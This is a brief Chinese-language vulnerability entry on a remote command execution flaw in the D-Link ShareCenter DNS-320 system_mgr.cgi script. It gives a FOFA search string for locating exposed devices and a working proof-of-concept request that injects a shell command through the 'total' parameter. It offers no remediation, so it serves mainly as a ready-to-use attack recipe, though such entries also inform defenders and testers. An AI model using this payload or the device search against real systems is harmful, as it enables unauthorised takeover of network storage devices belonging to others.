# D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞

## 漏洞描述

D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器

## 漏洞影响

> [!NOTE]
>
> D-Link ShareCenter DNS-320

## FOFA

> [!NOTE]
>
> app="D_Link-DNS-ShareCenter"

## 漏洞复现

登录页面如下

![image-20210605180903289](http://wikioss.peiqi.tech/vuln/image-20210605180903289.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

漏洞POC为

```
/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls;
```

![image-20210605181224009](http://wikioss.peiqi.tech/vuln/image-20210605181224009.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)